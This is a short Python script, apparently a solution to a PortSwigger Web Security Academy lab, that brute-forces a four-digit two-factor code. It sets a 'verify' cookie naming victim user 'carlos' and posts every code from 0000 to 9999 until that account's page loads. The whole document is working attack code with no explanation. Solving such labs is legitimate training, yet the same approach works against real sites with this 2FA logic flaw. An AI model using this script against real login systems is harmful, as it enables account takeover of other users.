import requests

#2Fa broken logic
# after login with your username:password and pass 2FA
# brute force the 2fa code

url = "https://0ade0085043794de8064e43f0061002a.web-security-academy.net/login2"
cookie = {
    "verify":"carlos",
}
data = {
    "mfa-code":1511
}
for i1 in range(0,10):
    for i2 in range(0,10):
        for i3 in range(0,10):
            for i4 in range(0,10):
                data['mfa-code'] =f"{i1}{i2}{i3}{i4}"
                response = requests.post(url=url,data=data,cookies=cookie)
                print(response.status_code)
                if "Your username is: carlos" in response.text:
                    print("Ok")
                    print("code:"+data['mfa-code'])
                    exit()
